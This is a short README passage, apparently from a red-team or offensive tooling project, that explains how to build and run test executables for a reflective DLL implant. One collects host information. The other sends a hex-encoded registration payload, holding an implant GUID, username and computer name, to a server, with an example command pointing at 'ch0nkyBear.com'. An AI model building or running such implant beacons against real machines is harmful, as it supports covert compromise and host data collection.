* Go to: reflectivedll> TestingFeatures> getInfo folder
* Run make to build the infoTest executable
* In the command line, run .\infoTest.exe 

* This executable will print out the data of the current machine
* It is currently not a feature of the dll

## To make an HTTP Request to the Server

* Go to: reflectivedll> TestingFeatures > http folder
* Run make to build the http executable
* In the command line, run .\http.exe fqdn port uri useTLS payload payloadLength
* The payload should be a hex string that (before converted to hex), is in the format "guid=implantTest&username=TestUser&=computername=TestComputer\r\n"
* EX: .\http.exe ch0nkyBear.com 443 /register 1 "23478y9hfj874" 13

* Currently: Issues handling payloads on the server side
* testInfo.cpp is a file that includes example hex encoded payloads to try out
